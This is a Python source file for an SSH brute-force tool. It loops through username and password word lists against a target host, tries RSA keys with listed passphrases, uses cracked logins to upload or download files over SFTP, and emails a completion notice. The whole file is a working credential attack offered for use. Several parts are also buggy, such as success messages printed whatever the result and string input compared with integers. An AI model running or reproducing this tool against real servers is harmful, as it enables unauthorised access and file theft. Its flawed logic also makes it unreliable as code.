# -*- coding: utf-8
print("""
@Author: W01f
@repo: https://github.com/W01fh4cker/comprehensive-ssh-brute-crack/
@version: 1.0
@time: 2022/4/13
██╗    ██╗ ██████╗ ██╗     ███████╗      ███████╗███████╗██╗  ██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗
██║    ██║██╔═══██╗██║     ██╔════╝      ██╔════╝██╔════╝██║  ██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██║ █╗ ██║██║   ██║██║     █████╗  █████╗███████╗███████╗███████║█████╗██║     ██████╔╝███████║██║     █████╔╝ 
██║███╗██║██║   ██║██║     ██╔══╝  ╚════╝╚════██║╚════██║██╔══██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
╚███╔███╔╝╚██████╔╝███████╗██║           ███████║███████║██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝           ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                                                                               
""")

import paramiko
import sys
import smtplib
import socket
import os
import configparser
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header

type = sys.argv[1]
hostname = sys.argv[2]

def getConfig(section, key):
    config = configparser.ConfigParser()
    a = os.path.split(os.path.realpath(__file__))
    path = 'data.conf'
    config.read(path)
    return config.get(section, key)

def sshClientConnection():
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
    with open("username.txt", 'r', encoding='utf-8') as f:
        user_name = f.readlines()
    with open("password.txt", 'r', encoding='utf-8') as f:
        pass_word = f.readlines()
    for i in user_name:
        for j in pass_word:
            try:
                ssh_client.connect(hostname, port=22, username=str(i), password=str(j))
                stdin, stdout, stderr = ssh_client.exec_command('whoami',timeout=10)
                print(stdout.read().decode('utf-8'))
                ssh_client.close()
            except:
                pass
    print("[√]连接成功！账号：" + str(i) + " 密码为：" + str(j) )

def sshRsaConnection():
    path = input("请输入您的id_rsa文件的绝对路径：")
    flag1 = input("您是否需要指定密码？如需要，请输入y；否则输入n。")
    if(flag1 == 'y'):
        with open("username.txt", 'r', encoding='utf-8') as f:
            user_name = f.readlines()
        with open("password.txt", 'r', encoding='utf-8') as f:
            pass_word = f.readlines()
        for k in pass_word:
            for l in user_name:
                try:
                    local_key = paramiko.RSAKey.from_private_key_file('/home/super/.ssh/id_rsa', password=str(k))
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
                    ssh.connect(hostname,
                                port=22,
                                username=l,
                                pkey=local_key)
                    stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
                    print(stdout.read().decode())
                    ssh.close()
                except:
                    pass
        print("[√]连接成功！账号：" + str(i) + " 密码为：" + str(j))
    elif(flag1 == 'n'):
        with open("username.txt", 'r', encoding='utf-8') as f:
            user_name = f.readlines()
        for m in user_name:
            local_key = paramiko.RSAKey.from_private_key_file('/home/super/.ssh/id_rsa')
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
            ssh.connect(hostname,
                        port=22,
                        username=m,
                        pkey=local_key)
            stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
            print(stdout.read().decode())
            ssh.close()
        print("[√]连接成功！账号：" + str(m))
    else:
        print("您的输入有误！")

def transFile():
    with open("username.txt", 'r', encoding='utf-8') as f:
        user_name = f.readlines()
    with open("password.txt", 'r', encoding='utf-8') as f:
        pass_word = f.readlines()
    flag2 = input("如果您要上传文件，请输入1；如果您要下载文件，请输入2。")
    if(flag2==1):
        global p,q
        for p in user_name:
            for q in pass_word:
                try:
                    parameter = (hostname, 22)
                    trans = paramiko.Transport(parameter)
                    trans.connect(username=p, password=q)
                    sftp = paramiko.SFTPClient.from_transport(trans)
                    local_path = input("请输入您要上传的本地文件的绝对路径：")
                    remote_path = input("请输入您要上传的位置的绝对路径：")
                    try:
                        sftp.put(localpath=local_path, remotepath=remote_path)
                        trans.close()
                        print("[√]上传成功！")
                    except:
                        print("[×]上传失败。")
                except:
                    pass
        print("[√]连接成功！账号：" + str(p) + " 密码为：" + str(q))
    elif(flag2==2):
        for p in user_name:
            for q in pass_word:
                try:
                    parameter = (hostname,22)
                    trans = paramiko.Transport(parameter)
                    trans.connect(username=p, password=q)
                    sftp = paramiko.SFTPClient.from_transport(trans)
                    local_path = input("请输入您要保存的位置的绝对路径：")
                    remote_path = input("请输入您要获取的文件的绝对路径：")
                    try:
                        sftp.get(localpath=local_path, remotepath=remote_path)
                        print("[√]下载成功！")
                        trans.close()
                    except:
                        print("[×]下载失败。")
                        trans.close()
                except:
                    pass
    else:
        print("您的输入有误！")

def send_msg():
    server = "smtp.qq.com"
    port = 465
    sender = getConfig("data", "sender")
    pw = getConfig("data", "pw")
    receivers = getConfig("data", "receivers")
    machine_name = socket.gethostname()
    msg_root = MIMEMultipart('mixed')
    msg_root['From'] = Header(f'{machine_name} <{sender}>')
    msg_root['Subject'] = Header(f'Message from {machine_name}', 'utf-8')
    mail_msg = f"""
	<html>
	  <body>
	  <p>[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]<br>
		 Message from {machine_name}</p>
	<p>Path: {os.getcwd()}<br>
	   Args: {' '.join(sys.argv)}</p>
       您的扫描任务已经完成，如果觉得本软件还不错的话请给个star，谢谢您！
       仓库地址：https://github.com/W01fh4cker/comprehensive-ssh-brute-crack
       有任何问题、建议，可以联系邮箱sharecat2022@gmail.com或者直接在github上面提出issues，地址为：https://github.com/W01fh4cker/comprehensive-ssh-brute-crack/issues。感谢您的每一个建议！祝您生活愉快！                               From W01fh4cker
	</body>
	</html>"""

    msg_root.attach(MIMEText(mail_msg, 'html', 'utf-8'))

    smtp = smtplib.SMTP_SSL(server, port)
    smtp.login(sender, pw)
    smtp.sendmail(sender, receivers, msg_root.as_string())
    print("[√]发送成功")
    smtp.quit()

if __name__ == '__main__':
    if type == '-C':
        try:
            sshClientConnection()
            send_msg()
        except Exception as e:
            print(e)
            print("请先自查您的输入、配置文件填写是否有问题！如果确认无误，请直接发邮件至sharecat2022@gmail.com或者提出issues！")
    elif type == '-R':
        try:
            sshRsaConnection()
            send_msg()
            print("[√]连接成功！")
        except Exception as e:
            print(e)
            print("请先自查您的输入、配置文件填写是否有问题！如果确认无误，请直接发邮件至sharecat2022@gmail.com或者提出issues！")
    elif type== '-T':
        try:
            transFile()
            send_msg()
        except Exception as e:
            print(e)
            print("请先自查您的输入、配置文件填写是否有问题！如果确认无误，请直接发邮件至sharecat2022@gmail.com或者提出issues！")
